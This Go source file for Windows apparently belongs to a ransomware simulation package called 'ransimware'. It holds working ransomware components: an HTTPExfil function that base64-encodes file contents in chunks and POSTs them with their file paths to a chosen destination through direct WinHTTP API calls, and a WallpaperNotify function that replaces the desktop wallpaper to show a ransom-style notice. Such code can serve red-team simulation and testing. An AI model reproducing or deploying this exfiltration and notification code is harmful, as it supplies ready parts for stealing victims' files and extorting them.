//+build windows

package ransimware

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"io"
	"os"
	"strconv"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
)

// HTTPExfil will return a function pointer to an ExfilFunc that
// exfils via HTTP POST requests with the specified headers.
func HTTPExfil(dst string, headers map[string]string) ExfilFunc {
	return func(path string, b []byte) error {
		var b64 string
		var data []byte
		var e error
		var n int
		var stream = bytes.NewReader(b)
		var tmp [4 * 1024 * 1024]byte

		for {
			if n, e = stream.Read(tmp[:]); (n == 0) && (e == io.EOF) {
				return nil
			} else if e != nil {
				return e
			}

			// Create request
			b64 = base64.StdEncoding.EncodeToString(tmp[:n])
			data = []byte(path + " " + b64)

			// Send Message
			if e = postRequest(dst, headers, data); e != nil {
				fmt.Println(e.Error())
			}
		}
	}
}

func postRequest(
	dst string,
	headers map[string]string,
	data []byte,
) error {
	var connHndl uintptr
	var e error
	var endpoint *uint16
	var combinedHdrs string
	var hdrs *uint16
	var method *uint16
	var path *uint16
	var port uint64
	var query string
	var reqHndl uintptr
	var sessionHndl uintptr
	var tmp []string
	var ua *uint16
	var winhttp *windows.LazyDLL = windows.NewLazySystemDLL("Winhttp")
	var winhttpAccessTypeAutomaticProxy uintptr = 4
	var winhttpFlagSecure uintptr = 0x00800000

	// Remove protocol
	if strings.HasPrefix(dst, "https://") {
		dst = strings.Replace(dst, "https://", "", 1)
	} else {
		dst = strings.Replace(dst, "http://", "", 1)
		winhttpFlagSecure = 0
	}

	// Strip query string
	tmp = strings.SplitN(dst, "/", 1)
	dst = tmp[0]
	query = "/"
	if len(tmp) > 1 {
		query = tmp[1]
	}

	// Strip port
	tmp = strings.Split(dst, ":")
	if len(tmp) > 1 {
		if port, e = strconv.ParseUint(tmp[1], 10, 64); e != nil {
			return e
		}
	}
	dst = tmp[0]

	// Combine headers
	for k, v := range headers {
		combinedHdrs += "\n\r" + k + ": " + v
	}
	combinedHdrs = strings.TrimSpace(combinedHdrs)

	// Create LPCWSTRs
	if endpoint, e = windows.UTF16PtrFromString(dst); e != nil {
		return e
	}

	if hdrs, e = windows.UTF16PtrFromString(combinedHdrs); e != nil {
		return e
	}

	if method, e = windows.UTF16PtrFromString("POST"); e != nil {
		return e
	}

	if path, e = windows.UTF16PtrFromString(query); e != nil {
		return e
	}

	ua, e = windows.UTF16PtrFromString("Go-http-client/1.1")
	if e != nil {
		return e
	}

	// Create session
	sessionHndl, _, _ = winhttp.NewProc("WinHttpOpen").Call(
		uintptr(unsafe.Pointer(ua)),
		winhttpAccessTypeAutomaticProxy,
		0,
		0,
		0,
	)
	if sessionHndl == 0 {
		return nil
	}

	// Create connection
	connHndl, _, _ = winhttp.NewProc("WinHttpConnect").Call(
		sessionHndl,
		uintptr(unsafe.Pointer(endpoint)),
		uintptr(port),
		0,
	)
	if connHndl == 0 {
		return nil
	}

	// Create HTTP request
	reqHndl, _, _ = winhttp.NewProc("WinHttpOpenRequest").Call(
		connHndl,
		uintptr(unsafe.Pointer(method)),
		uintptr(unsafe.Pointer(path)),
		0,
		0,
		0,
		winhttpFlagSecure,
	)
	if reqHndl == 0 {
		return nil
	}

	// Send HTTP request
	winhttp.NewProc("WinHttpSendRequest").Call(
		reqHndl,
		uintptr(unsafe.Pointer(hdrs)),
		uintptr(len([]byte(combinedHdrs))),
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		uintptr(len(data)),
		0,
	)

	return nil
}

// WallpaperNotify is a NotifyFunc that sets the background wallpaper.
func WallpaperNotify(image string, png []byte) NotifyFunc {
	return func() error {
		var e error
		var f *os.File
		var spiSetdeskwallpaper uintptr = 0x0014
		var spifSendchange uintptr = 0x0002
		var spifUpdateinifile uintptr = 0x0001
		var user32 *windows.LazyDLL

		// Create image file
		if f, e = os.Create(image); e != nil {
			return e
		}

		// Write PNG to file
		f.Write(png)
		f.Close()

		// Change background with Windows API
		user32 = windows.NewLazySystemDLL("User32")
		user32.NewProc("SystemParametersInfoA").Call(
			spiSetdeskwallpaper,
			0,
			uintptr(unsafe.Pointer(&[]byte(image)[0])),
			spifSendchange|spifUpdateinifile,
		)

		// Remove image file
		os.Remove(image)

		return nil
	}
}
